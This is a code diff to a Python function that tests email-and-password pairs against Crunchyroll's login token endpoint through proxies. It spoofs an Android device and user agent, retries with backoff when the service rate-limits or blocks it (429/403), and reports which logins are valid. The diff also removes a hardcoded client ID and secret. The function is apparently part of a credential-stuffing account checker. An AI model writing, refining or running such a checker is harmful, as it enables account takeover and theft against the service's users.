@@ -1347,32 +1347,39 @@ def check_crunchyroll(email, password, proxy=None):
             # token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
             token_url = "https://www.crunchyroll.com/auth/v1/token"
             
+            headers = {
+                "authorization": f"Basic {basic_auth}",
+                "content-type": "application/x-www-form-urlencoded",
+                "user-agent": user_agent,
+                "accept": "application/json",
+                "accept-language": "en-US,en;q=0.9",
+                "x-datadog-sampling-priority": "0",
+                "etp-anonymous-id": device_id,
+                "connection": "Keep-Alive",
+                "host": "www.crunchyroll.com"
+            }
+
             token_data = {
                 "grant_type": "password",
                 "username": email,
                 "password": password,
                 "scope": "offline_access",
-                "client_id": "y2arvjb0h0rgvtizlovy",
-                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
-                "device_type": "SamsungTV",
                 "device_id": device_id,
-                "device_name": "Goku"
+                "device_type": "Android",
+                "device_name": "sdk_gphone64_x86_64"
             }
 
-            headers = {
-                "host": "beta-api.crunchyroll.com",
-                "x-datadog-sampling-priority": "0",
-                "etp-anonymous-id": device_id,
-                "content-type": "application/x-www-form-urlencoded",
-                "user-agent": user_agent,
-                "accept-encoding": "gzip"
-            }
+            print(f"[DEBUG] Login Attempt {attempt+1} | UA: {user_agent[:70]}...")
 
-            print(f"[DEBUG] Login Attempt {attempt+1} | Status: ", end="")
+            resp = requests.post(
+                token_url, 
+                data=token_data, 
+                headers=headers, 
+                proxies=proxies, 
+                timeout=25
+            )
 
-            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)
-
-            print(f"{resp.status_code} | Body: {resp.text[:350]}")
+            print(f"[DEBUG] Status: {resp.status_code} | Body: {resp.text[:450]}")
 
             if resp.status_code == 200:
                 access_token = resp.json().get('access_token')
@@ -1381,7 +1388,7 @@ def check_crunchyroll(email, password, proxy=None):
             elif resp.status_code == 401:
                 result['message'] = "Invalid email or password"
                 return result
-            elif resp.status_code == 429:
+            elif resp.status_code in (429, 403):
                 time.sleep(3 + attempt * 2)
                 continue
             else:
